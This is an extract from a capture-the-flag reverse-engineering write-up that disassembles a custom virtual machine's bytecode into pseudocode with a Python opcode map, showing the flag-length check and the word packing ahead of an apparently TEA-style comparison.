0x00000000, 0x00000032, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000021, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x0000000A, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000069, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x0000006E, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000070, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000075, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000074, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000020, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000066, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x0000006C, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000061, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000067, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x0000003A, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x0000000A, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000013, 0x00000049, 0x00000001, 0x00000003, 0x00000000, 0x00000001, 0x00000001, 0x0000002B, 0x00000001, 0x00000002, 0x00000001, 0x00000061, 0x00000000, 0x00000000, 0x00000005, 0x00000000, 0x00000000, 0x00000008, 0x00000001, 0x00000002, 0x0000000E, 0x00000001, 0x00000003, 0x00000001, 0x00000000, 0x00000000, 0x00000005, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000001, 0x00000005, 0x00000100, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x00000006, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x00000006, 0x00000000, 0x00000002, 0x00000000, 0x00000006, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x00000006, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x00000006, 0x00000000, 0x00000002, 0x00000000, 0x00000006, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x00000006, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x00000006, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000001, 0x00000005, 0x00000100, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x00000007, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x00000007, 0x00000000, 0x00000002, 0x00000000, 0x00000007, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x00000007, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x00000007, 0x00000000, 0x00000002, 0x00000000, 0x00000007, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x00000007, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x00000007, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000001, 0x00000005, 0x00000100, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x00000008, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x00000008, 0x00000000, 0x00000002, 0x00000000, 0x00000008, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x00000008, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x00000008, 0x00000000, 0x00000002, 0x00000000, 0x00000008, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x00000008, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x00000008, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000001, 0x00000005, 0x00000100, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x00000009, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x00000009, 0x00000000, 0x00000002, 0x00000000, 0x00000009, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x00000009, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x00000009, 0x00000000, 0x00000002, 0x00000000, 0x00000009, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x00000009, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x00000009, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000001, 0x00000005, 0x00000100, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x0000000A, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x0000000A, 0x00000000, 0x00000002, 0x00000000, 0x0000000A, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x0000000A, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x0000000A, 0x00000000, 0x00000002, 0x00000000, 0x0000000A, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x0000000A, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x0000000A, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000001, 0x00000005, 0x00000100, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x0000000B, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x0000000B, 0x00000000, 0x00000002, 0x00000000, 0x0000000B, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x0000000B, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x0000000B, 0x00000000, 0x00000002, 0x00000000, 0x0000000B, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x0000000B, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x0000000B, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000001, 0x00000005, 0x00000100, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x0000000C, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x0000000C, 0x00000000, 0x00000002, 0x00000000, 0x0000000C, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x0000000C, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x0000000C, 0x00000000, 0x00000002, 0x00000000, 0x0000000C, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x0000000C, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x0000000C, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000001, 0x00000005, 0x00000100, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x0000000D, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x0000000D, 0x00000000, 0x00000002, 0x00000000, 0x0000000D, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x0000000D, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x0000000D, 0x00000000, 0x00000002, 0x00000000, 0x0000000D, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x0000000D, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x0000000D, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000001, 0x00000005, 0x00000100, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x0000000E, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x0000000E, 0x00000000, 0x00000002, 0x00000000, 0x0000000E, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x0000000E, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x0000000E, 0x00000000, 0x00000002, 0x00000000, 0x0000000E, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x0000000E, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x0000000E, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000001, 0x00000005, 0x00000100, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x0000000F, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x0000000F, 0x00000000, 0x00000002, 0x00000000, 0x0000000F, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x0000000F, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x0000000F, 0x00000000, 0x00000002, 0x00000000, 0x0000000F, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x0000000F, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x0000000F, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000001, 0x00000005, 0x00000100, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x00000010, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x00000010, 0x00000000, 0x00000002, 0x00000000, 0x00000010, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x00000010, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x00000010, 0x00000000, 0x00000002, 0x00000000, 0x00000010, 0x0000000A, 0x00000000, 0x00000005, 0x00000002, 0x00000010, 0x00000000, 0x00000006, 0x00000000, 0x00000000, 0x00000007, 0x00000010, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000005, 0x00000006, 0x00000000, 0x00000005, 0x00000007, 0x00000000, 0x00000005, 0x00000008, 0x00000000, 0x00000005, 0x00000009, 0x00000000, 0x00000005, 0x0000000A, 0x00000000, 0x00000005, 0x0000000B, 0x00000000, 0x00000005, 0x0000000C, 0x00000000, 0x00000005, 0x0000000D, 0x00000000, 0x00000005, 0x0000000E, 0x00000000, 0x00000005, 0x0000000F, 0x00000000, 0x00000005, 0x00000010, 0x00000000, 0x00000006, 0x00000001, 0x00000000, 0x00000006, 0x00000002, 0x00000000, 0x00000001, 0x00000014, 0x0000011C, 0x00000001, 0x00000000, 0x00000154, 0x0000000C, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0xE8D1D5DF, 0x00000001, 0x00000013, 0x00000183, 0x00000001, 0x00000014, 0x00000153, 0x0000000E, 0x00000001, 0x00000000, 0x00000001, 0x00000000, 0xF5E3C114, 0x0000000E, 0x00000002, 0x00000000, 0x00000006, 0x00000001, 0x00000000, 0x00000006, 0x00000002, 0x00000000, 0x00000001, 0x00000014, 0x00000127, 0x00000001, 0x00000000, 0x00000154, 0x0000000C, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x228EC216, 0x00000001, 0x00000013, 0x00000183, 0x00000001, 0x00000014, 0x00000153, 0x0000000E, 0x00000001, 0x00000000, 0x00000001, 0x00000000, 0x89D45A61, 0x0000000E, 0x00000002, 0x00000000, 0x00000006, 0x00000001, 0x00000000, 0x00000006, 0x00000002, 0x00000000, 0x00000001, 0x00000014, 0x00000132, 0x00000001, 0x00000000, 0x00000154, 0x0000000C, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x655B8F69, 0x00000001, 0x00000013, 0x00000183, 0x00000001, 0x00000014, 0x00000153, 0x0000000E, 0x00000001, 0x00000000, 0x00000001, 0x00000000, 0x2484A07A, 0x0000000E, 0x00000002, 0x00000000, 0x00000006, 0x00000001, 0x00000000, 0x00000006, 0x00000002, 0x00000000, 0x00000001, 0x00000014, 0x0000013D, 0x00000001, 0x00000000, 0x00000154, 0x0000000C, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0xD9E5E7F8, 0x00000001, 0x00000013, 0x00000183, 0x00000001, 0x00000014, 0x00000153, 0x0000000E, 0x00000001, 0x00000000, 0x00000001, 0x00000000, 0x3A441532, 0x0000000E, 0x00000002, 0x00000000, 0x00000006, 0x00000001, 0x00000000, 0x00000006, 0x00000002, 0x00000000, 0x00000001, 0x00000014, 0x00000148, 0x00000001, 0x00000000, 0x00000154, 0x0000000C, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x91AB7E88, 0x00000001, 0x00000013, 0x00000183, 0x00000001, 0x00000014, 0x00000153, 0x0000000E, 0x00000001, 0x00000000, 0x00000001, 0x00000000, 0x69FC64BC, 0x0000000E, 0x00000002, 0x00000000, 0x00000006, 0x00000001, 0x00000000, 0x00000001, 0x00000000, 0x007D3765, 0x0000000E, 0x00000001, 0x00000000, 0x00000001, 0x00000000, 0x00000189, 0x0000000C, 0x00000000, 0x00000000, 0x00000063, 0x00000000, 0x00000000, 0x00000001, 0x00000003, 0x9E3779B9, 0x00000001, 0x00000004, 0x00095C4C, 0x00000001, 0x00000005, 0x0000871D, 0x00000001, 0x00000006, 0x0001A7B7, 0x00000001, 0x00000007, 0x0012C7C7, 0x00000001, 0x00000008, 0x00000000, 0x00000001, 0x00000011, 0x00000010, 0x00000001, 0x00000012, 0x00000020, 0x00000001, 0x00000013, 0x00000160, 0x00000001, 0x0000000A, 0x00000000, 0x00000001, 0x0000000B, 0x00000020, 0x00000001, 0x0000000C, 0x00000001, 0x00000007, 0x00000008, 0x00000003, 0x00000002, 0x00000000, 0x00000002, 0x0000000A, 0x00000000, 0x00000011, 0x00000007, 0x00000000, 0x00000004, 0x00000002, 0x0000000E, 0x00000000, 0x00000002, 0x00000000, 0x00000002, 0x00000007, 0x00000000, 0x00000008, 0x00000002, 0x0000000F, 0x00000000, 0x00000002, 0x00000000, 0x00000002, 0x00000009, 0x00000000, 0x00000012, 0x00000007, 0x00000000, 0x00000005, 0x00000002, 0x00000010, 0x00000000, 0x00000002, 0x00000000, 0x0000000E, 0x0000000B, 0x00000000, 0x0000000F, 0x0000000B, 0x00000000, 0x00000010, 0x00000007, 0x00000001, 0x00000000, 0x00000002, 0x00000000, 0x00000001, 0x0000000A, 0x00000000, 0x00000011, 0x00000007, 0x00000000, 0x00000006, 0x00000002, 0x0000000E, 0x00000000, 0x00000002, 0x00000000, 0x00000001, 0x00000007, 0x00000000, 0x00000008, 0x00000002, 0x0000000F, 0x00000000, 0x00000002, 0x00000000, 0x00000001, 0x00000009, 0x00000000, 0x00000012, 0x00000007, 0x00000000, 0x00000007, 0x00000002, 0x00000010, 0x00000000, 0x00000002, 0x00000000, 0x0000000E, 0x0000000B, 0x00000000, 0x0000000F, 0x0000000B, 0x00000000, 0x00000010, 0x00000007, 0x00000002, 0x00000000, 0x00000008, 0x0000000B, 0x0000000C, 0x0000000E, 0x0000000B, 0x0000000A, 0x0000000C, 0x00000014, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x0000006E, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x0000006F, 0x00000062, 0x00000000, 0x00000000, 0x0000000C, 0x00000014, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000079, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000065, 0x00000062, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000073, 0x00000062, 0x00000000, 0x00000000, 0x0000000C, 0x00000014, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000]# print(len(a))# for i in range(0, len(a), 3):# print(a[i], a[i+1], a[i+2])asmmm_map = &#123; 0: &quot;nop&quot;, 1: &quot;VM-&gt;REG[&#123;0&#125;] = &#123;1&#125;&quot;, 2: &quot;VM-&gt;REG[&#123;0&#125;] = VM-&gt;REG[&#123;1&#125;]&quot;, # 指定位置的数据传给指定的寄存器 3: &quot;v3 = (VM-&gt;stack_top - &#123;1&#125;) VM-&gt;REG[&#123;0&#125;] = VM-&gt;stack[v3];&quot;, 4: &quot;result = (VM-&gt;stack_top - &#123;0&#125;) VM-&gt;stack[result] = VM-&gt;REG[&#123;1&#125;]&quot;, 5: &quot;push REG[&#123;0&#125;]&quot;, 6: &quot;pop REG[&#123;0&#125;]&quot;, 7: &quot;VM-&gt;REG[&#123;0&#125;] += VM-&gt;REG[&#123;1&#125;]&quot;, 8: &quot;VM-&gt;REG[&#123;0&#125;] -= VM-&gt;REG[&#123;1&#125;]&quot;, 9: &quot;VM-&gt;REG[&#123;0&#125;] /= VM-&gt;REG[&#123;1&#125;]&quot;, 10: &quot;VM-&gt;REG[&#123;0&#125;] *= VM-&gt;REG[&#123;1&#125;];&quot;, 11: &quot;VM-&gt;REG[&#123;0&#125;] ^= VM-&gt;REG[&#123;1&#125;]&quot;, 12: &quot;VM-&gt;_eip = 3 * VM-&gt;REG[&#123;0&#125;]&quot;, 13: &quot;CMP VM-&gt;REG[&#123;1&#125;], VM-&gt;REG[&#123;0&#125; if yes: VM-&gt;_eip = 3 * VM-&gt;REG[19]&quot;, 14: &quot;CMP VM-&gt;REG[&#123;1&#125;], VM-&gt;REG[&#123;0&#125;] if yes: VM-&gt;_eip = 3 * VM-&gt;REG[19]&quot;, 15: &quot;VM-&gt;REG[&#123;1&#125;] &lt; VM-&gt;REG[&#123;0&#125;] if yes: VM-&gt;_eip = 3 * VM-&gt;REG[19]&quot;, 16: &quot;VM-&gt;REG[&#123;1&#125;] &gt; VM-&gt;REG[&#123;0&#125;] if yes: VM-&gt;_eip = 3 * VM-&gt;REG[19]&quot;, 97: &quot;getchar&quot;, 98: &quot;putchar&quot;, 99: &quot;vm quit&quot;&#125;for i in range(0, len(a), 3): print(asmmm_map[a[i]].format(a[i+1], a[i+2])) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402VM-&gt;REG[0] = 87 putcharVM-&gt;REG[0] = 101putcharVM-&gt;REG[0] = 108putcharVM-&gt;REG[0] = 99 putcharVM-&gt;REG[0] = 111putcharVM-&gt;REG[0] = 109putcharVM-&gt;REG[0] = 101putcharVM-&gt;REG[0] = 32 putcharVM-&gt;REG[0] = 116putcharVM-&gt;REG[0] = 111putcharVM-&gt;REG[0] = 32putcharVM-&gt;REG[0] = 86putcharVM-&gt;REG[0] = 78putcharVM-&gt;REG[0] = 67putcharVM-&gt;REG[0] = 84putcharVM-&gt;REG[0] = 70putcharVM-&gt;REG[0] = 50putcharVM-&gt;REG[0] = 48putcharVM-&gt;REG[0] = 50putcharVM-&gt;REG[0] = 50putcharVM-&gt;REG[0] = 33putcharVM-&gt;REG[0] = 10putcharVM-&gt;REG[0] = 105putcharVM-&gt;REG[0] = 110putcharVM-&gt;REG[0] = 112putcharVM-&gt;REG[0] = 117putcharVM-&gt;REG[0] = 116putcharVM-&gt;REG[0] = 32putcharVM-&gt;REG[0] = 102putcharVM-&gt;REG[0] = 108putcharVM-&gt;REG[0] = 97putcharVM-&gt;REG[0] = 103putcharVM-&gt;REG[0] = 58putcharVM-&gt;REG[0] = 10putcharVM-&gt;REG[19] = 73VM-&gt;REG[3] = 0VM-&gt;REG[1] = 43VM-&gt;REG[2] = 1getcharpush REG[0]VM-&gt;REG[1] -= VM-&gt;REG[2]CMP VM-&gt;REG[3], VM-&gt;REG[1] if yes: VM-&gt;_eip = 3 * VM-&gt;REG[19] //输入flag，长度是43VM-&gt;REG[0] = 0push REG[0]nopnoppop REG[0]VM-&gt;REG[5] = 256VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[6] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[6] += VM-&gt;REG[0]VM-&gt;REG[0] = VM-&gt;REG[6]VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[6] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[6] += VM-&gt;REG[0]VM-&gt;REG[0] = VM-&gt;REG[6]VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[6] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[6] += VM-&gt;REG[0]noppop REG[0]VM-&gt;REG[5] = 256VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[7] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[7] += VM-&gt;REG[0]VM-&gt;REG[0] = VM-&gt;REG[7]VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[7] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[7] += VM-&gt;REG[0]VM-&gt;REG[0] = VM-&gt;REG[7]VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[7] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[7] += VM-&gt;REG[0]noppop REG[0]VM-&gt;REG[5] = 256VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[8] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[8] += VM-&gt;REG[0]VM-&gt;REG[0] = VM-&gt;REG[8]VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[8] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[8] += VM-&gt;REG[0]VM-&gt;REG[0] = VM-&gt;REG[8]VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[8] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[8] += VM-&gt;REG[0]noppop REG[0]VM-&gt;REG[5] = 256VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[9] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[9] += VM-&gt;REG[0]VM-&gt;REG[0] = VM-&gt;REG[9]VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[9] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[9] += VM-&gt;REG[0]VM-&gt;REG[0] = VM-&gt;REG[9]VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[9] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[9] += VM-&gt;REG[0]noppop REG[0]VM-&gt;REG[5] = 256VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[10] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[10] += VM-&gt;REG[0]VM-&gt;REG[0] = VM-&gt;REG[10]VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[10] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[10] += VM-&gt;REG[0]VM-&gt;REG[0] = VM-&gt;REG[10]VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[10] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[10] += VM-&gt;REG[0]noppop REG[0]VM-&gt;REG[5] = 256VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[11] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[11] += VM-&gt;REG[0]VM-&gt;REG[0] = VM-&gt;REG[11]VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[11] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[11] += VM-&gt;REG[0]VM-&gt;REG[0] = VM-&gt;REG[11]VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[11] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[11] += VM-&gt;REG[0]noppop REG[0]VM-&gt;REG[5] = 256VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[12] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[12] += VM-&gt;REG[0]VM-&gt;REG[0] = VM-&gt;REG[12]VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[12] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[12] += VM-&gt;REG[0]VM-&gt;REG[0] = VM-&gt;REG[12]VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[12] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[12] += VM-&gt;REG[0]noppop REG[0]VM-&gt;REG[5] = 256VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[13] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[13] += VM-&gt;REG[0]VM-&gt;REG[0] = VM-&gt;REG[13]VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[13] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[13] += VM-&gt;REG[0]VM-&gt;REG[0] = VM-&gt;REG[13]VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[13] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[13] += VM-&gt;REG[0]noppop REG[0]VM-&gt;REG[5] = 256VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[14] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[14] += VM-&gt;REG[0]VM-&gt;REG[0] = VM-&gt;REG[14]VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[14] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[14] += VM-&gt;REG[0]VM-&gt;REG[0] = VM-&gt;REG[14]VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[14] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[14] += VM-&gt;REG[0]noppop REG[0]VM-&gt;REG[5] = 256VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[15] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[15] += VM-&gt;REG[0]VM-&gt;REG[0] = VM-&gt;REG[15]VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[15] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[15] += VM-&gt;REG[0]VM-&gt;REG[0] = VM-&gt;REG[15]VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[15] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[15] += VM-&gt;REG[0]noppop REG[0]VM-&gt;REG[5] = 256VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[16] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[16] += VM-&gt;REG[0]VM-&gt;REG[0] = VM-&gt;REG[16]VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[16] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[16] += VM-&gt;REG[0]VM-&gt;REG[0] = VM-&gt;REG[16]VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[16] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[16] += VM-&gt;REG[0]noppush REG[6]push REG[7]push REG[8]push REG[9]push REG[10]push REG[11]push REG[12]push REG[13]push REG[14]push REG[15]push REG[16]pop REG[1]pop REG[2]VM-&gt;REG[20] = 284VM-&gt;REG[0] = 340VM-&gt;_eip = 3 * VM-&gt;REG[0]VM-&gt;REG[0] = 3906065887VM-&gt;REG[19] = 387VM-&gt;REG[20] = 339CMP VM-&gt;REG[0], VM-&gt;REG[1] if yes: VM-&gt;_eip = 3 * VM-&gt;REG[19]VM-&gt;REG[0] = 4125344020CMP VM-&gt;REG[0], VM-&gt;REG[2] if yes: VM-&gt;_eip = 3 * VM-&gt;REG[19]pop REG[1]pop REG[2]VM-&gt;REG[20] = 295VM-&gt;REG[0] = 340VM-&gt;_eip = 3 * VM-&gt;REG[0]VM-&gt;REG[0] = 579781142VM-&gt;REG[19] = 387VM-&gt;REG[20] = 339CMP VM-&gt;REG[0], VM-&gt;REG[1] if yes: VM-&gt;_eip = 3 * VM-&gt;REG[19]VM-&gt;REG[0] = 2312395361CMP VM-&gt;REG[0], VM-&gt;REG[2] if yes: VM-&gt;_eip = 3 * VM-&gt;REG[19]pop REG[1]pop REG[2]VM-&gt;REG[20] = 306VM-&gt;REG[0] = 340VM-&gt;_eip = 3 * VM-&gt;REG[0]VM-&gt;REG[0] = 1700499305VM-&gt;REG[19] = 387VM-&gt;REG[20] = 339CMP VM-&gt;REG[0], VM-&gt;REG[1] if yes: VM-&gt;_eip = 3 * VM-&gt;REG[19]VM-&gt;REG[0] = 612671610CMP VM-&gt;REG[0], VM-&gt;REG[2] if yes: VM-&gt;_eip = 3 * VM-&gt;REG[19]pop REG[1]pop REG[2]VM-&gt;REG[20] = 317VM-&gt;REG[0] = 340VM-&gt;_eip = 3 * 